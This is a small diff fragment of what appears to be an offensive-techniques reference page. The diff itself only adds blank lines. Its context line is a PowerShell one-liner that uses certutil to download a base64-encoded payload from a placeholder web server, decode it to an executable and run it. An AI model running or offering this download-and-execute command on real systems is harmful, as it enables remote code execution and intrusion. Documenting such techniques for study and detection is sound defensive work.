@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:10.682710+00:00'
 ```powershell
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
+
+
